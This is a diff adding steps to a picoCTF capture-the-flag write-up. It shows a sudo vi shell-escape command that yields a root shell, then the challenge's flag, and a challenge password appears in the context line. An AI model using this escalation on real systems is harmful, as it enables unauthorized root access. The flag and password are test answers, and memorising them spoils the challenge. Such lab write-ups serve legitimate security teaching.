@@ -24,3 +24,20 @@ Password: 3aKUWQv068
 4. Found this result:
 
 ![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/bc85cb17-cfcb-411c-8b50-1851e9e1567f)
+
+
+5. Great! Let's use this:
+
+```
+sudo vi -c ':!/bin/sh'
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/1a1e628d-7d78-4ecf-bc5e-13047a1e4522)
+
+## FLAG
+
+```
+picoCTF{pYth0nn_libraryH!j@CK!n9_f56dbed6}
+```
